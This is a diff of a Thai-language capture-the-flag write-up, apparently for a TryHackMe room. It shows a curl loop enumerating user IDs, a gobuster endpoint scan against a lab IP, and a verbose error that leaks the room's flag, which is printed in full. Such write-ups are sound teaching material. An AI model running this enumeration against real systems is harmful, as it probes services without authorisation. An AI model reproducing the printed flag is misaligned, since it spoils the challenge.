@@ -17,7 +17,7 @@
 
 เมื่อเข้าเว็บไซต์หลัก จะพบหน้าเว็บที่แสดงข้อมูลเกี่ยวกับ API โดยตรง ดังนี้
 
-```json
+```
 GET /api/user/<user_id>
 GET /api/user/123
 Retrieve user information by ID. User ID must be numeric.
@@ -32,7 +32,7 @@ Retrieve user information by ID. User ID must be numeric.
 
 จากข้อมูลที่หน้าเว็บให้มา จึงลองเรียก API เพื่อดึงข้อมูลผู้ใช้ตามหมายเลข ID โดยใช้คำสั่ง `curl` ดังนี้
 
-```bash
+```
 for i in {1..10}; do 
   curl -s http://10.49.156.80:5002/api/user/$i
 done
@@ -47,7 +47,7 @@ done
 
 เพื่อดูว่ามี API อื่นที่เปิดอยู่หรือไม่ จึงใช้ gobuster เพื่อค้นหา endpoint เพิ่มเติม
 
-```bash
+```
 gobuster dir \
 -u http://10.49.156.80:5002/ \
 -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
@@ -55,10 +55,12 @@ gobuster dir \
 ```
 
 จากการสแกน พบ endpoint ที่น่าสนใจดังนี้
-```json
+
+```
 /api/user/me
 /api/user/current
 ```
+
 ซึ่งปกติแล้ว endpoint ลักษณะนี้ควรถูกเรียกใช้งานได้เฉพาะผู้ใช้ที่ login แล้วเท่านั้น
 
 ---
@@ -67,14 +69,14 @@ gobuster dir \
 
 เมื่อทดลองเรียก endpoint ที่พบ ด้วยคำสั่ง
 
-```bash
+```
 curl -i http://10.49.156.80:5002/api/user/me
 ```
 
 ระบบตอบกลับด้วย error และแสดงข้อมูล debug ออกมา
 ซึ่งใน error message มี flag แสดงอยู่โดยตรง
 
-```json
+```
 "debug_info": { "flag": "THM{V3RB0S3_3RR0R_L34K}" }, "error": "Invalid user ID format: me. Flag: THM{V3RB0S3_3RR0R_L34K}", "traceback": "Traceback (most recent call last):\n File \"/app/app.py\", line 21, in get_user\n raise ValueError(f\"Invalid user ID format: {user_id}. Flag: {FLAG}\")\nValueError: Invalid user ID format: me. Flag: THM{V3RB0S3_3RR0R_L34K}\n"
 ```
 
@@ -84,7 +86,7 @@ curl -i http://10.49.156.80:5002/api/user/me
 
 จาก error message ที่ระบบแสดง ทำให้สามารถเห็น flag ได้ดังนี้
 
-```json
+```
 THM{V3RB0S3_3RR0R_L34K}
 ```
 
